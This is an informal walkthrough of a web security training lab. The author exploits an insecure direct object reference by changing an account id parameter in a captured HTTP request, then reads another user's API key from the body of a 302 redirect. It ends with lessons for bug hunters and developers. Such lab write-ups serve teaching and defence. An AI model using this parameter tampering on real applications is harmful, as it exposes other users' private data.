this one is a little bit tricky. same idea we should some how get the info of Carlos in a redirect?
first lets log in but at the same time have burp on and get every request.
when we log in there is a good request:
```
GET /my-account?id=wiener HTTP/2
Host: 0aef000903175ea0816048b500f50012.web-security-academy.net
Cookie: session=pFu9Ts93964wB3ZYk43wl0ODcojCLL6y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0aef000903175ea0816048b500f50012.web-security-academy.net/login
Sec-Gpc: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Priority: u=0, i
Te: trailers
```
we are in IDOR like problems so when we see id this is a target.
lets change the id to carlos:
```
GET /my-account?id=carlos HTTP/2
Host: 0aef000903175ea0816048b500f50012.web-security-academy.net
Cookie: session=pFu9Ts93964wB3ZYk43wl0ODcojCLL6y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0aef000903175ea0816048b500f50012.web-security-academy.net/login
Sec-Gpc: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Priority: u=0, i
Te: trailers
```
and yes it solve it in the response we get a 302(redirect) but when we see the response:
```
<p>Your username is: carlos</p>
                        <div>Your API Key is: OIUILNliJgVi1TIXP8nR6ALdudLisiBv</div><br/>
```
and done.

The interesting part of this lab isn't the IDOR itself. The real lesson is how the backend handles authorization and response generation. because lets be honest what is the lesson of this lab?

in the backend, order of how they handle data is very important. probably in this lab One possible implementation is that the application fetches Carlos's data and generates the response before performing the authorization check. then after that another part checked and said hey you can not have access the data of Carlos, because you are not Carlos(based on session and cookie), but probably they forgot to edit the response and they gives you the response and that's it.

From a bug bounty perspective, never assume that a `301` or `302` response contains no useful information. Always inspect the response body, headers, and cookies. Sensitive data can sometimes be leaked even when the application attempts to deny access.

as a developer view As a developer, always perform authorization checks before retrieving or rendering sensitive data. If access is denied, return the error or redirect immediately without generating the protected content. and always make sure that you know what could be in the body in response.
